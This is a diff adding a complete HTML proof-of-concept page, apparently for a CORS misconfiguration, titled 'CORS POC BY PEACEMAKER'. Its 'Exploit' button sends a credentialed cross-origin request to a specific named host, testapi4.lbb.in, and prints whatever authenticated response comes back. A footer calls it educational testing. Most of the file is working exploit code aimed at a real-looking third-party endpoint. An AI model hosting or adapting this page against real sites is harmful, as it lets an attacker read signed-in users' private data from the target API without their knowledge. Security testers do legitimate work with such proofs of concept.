@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS POC BY PEACEMAKER</title>
+  <style>
+    body {
+      background: linear-gradient(to right, #0f0f3d, #000000);
+      color: #00ffcc;
+      font-family: 'Courier New', Courier, monospace;
+      padding: 2rem;
+      margin: 0;
+    }
+
+    h1 {
+      color: #00ffff;
+      text-shadow: 0 0 10px #00ffff;
+      font-size: 2rem;
+      text-align: center;
+    }
+
+    #console {
+      background: #121212;
+      border: 1px solid #00ffcc;
+      padding: 1rem;
+      margin-top: 1rem;
+      min-height: 150px;
+      font-size: 1rem;
+      overflow-wrap: break-word;
+      box-shadow: 0 0 10px #00ffcc;
+    }
+
+    button {
+      background-color: #000000;
+      color: #00ffcc;
+      border: 2px solid #00ffcc;
+      padding: 10px 20px;
+      font-size: 1.1rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+      text-shadow: 0 0 5px #00ffcc;
+    }
+
+    button:hover {
+      background-color: #00ffcc;
+      color: #000000;
+      box-shadow: 0 0 15px #00ffcc;
+    }
+
+    footer {
+      margin-top: 2rem;
+      text-align: center;
+      font-size: 0.8rem;
+      color: #444;
+    }
+  </style>
+</head>
+<body>
+  <h1>🚀 CORS POC BY PEACEMAKER</h1>
+  <div style="text-align: center;">
+    <button onclick="cors()">🔥 Exploit</button>
+  </div>
+  <div id="console">💻 Output will appear here...</div>
+
+  <script>
+    function cors() {
+      const target = "https://testapi4.lbb.in"; // 🔥 Replace with your endpoint
+      var xhr = new XMLHttpRequest();
+      xhr.onreadystatechange = function () {
+        if (this.readyState == 4) {
+          let output = document.getElementById("console");
+          if (this.status == 200) {
+            output.innerText = '✅ SUCCESS:\n' + this.responseText;
+          } else {
+            output.innerText = '❌ ERROR:\nStatus: ' + this.status + '\nResponse: ' + this.responseText;
+          }
+        }
+      };
+      xhr.open("GET", target, true);
+      xhr.withCredentials = true;
+      xhr.send();
+    }
+  </script>
+
+  <footer>
+    Built for educational testing by <strong>PEACEMAKER</strong> ⚔️
+  </footer>
+</body>
+</html>
